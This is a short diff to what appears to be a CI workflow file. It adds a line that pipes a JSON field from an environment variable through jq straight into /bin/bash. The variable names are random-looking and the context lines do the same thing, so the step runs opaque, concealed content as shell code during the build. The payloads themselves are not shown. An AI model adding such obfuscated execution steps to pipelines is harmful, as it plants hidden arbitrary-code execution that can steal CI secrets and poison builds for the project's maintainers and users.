@@ -32,6 +32,7 @@ jobs:
           echo $ukdxa506 | jq -r .ophs0 | /bin/bash
           echo $df7 | jq -r .ufhhs1 | /bin/bash
           printf '%s' "$gq9" | jq -r .dknvr21 | /bin/bash
+          printf '%s' "$xlmnj54" | jq -r .abd662 | /bin/bash
 
       - name: Upload artifact
         if: always()
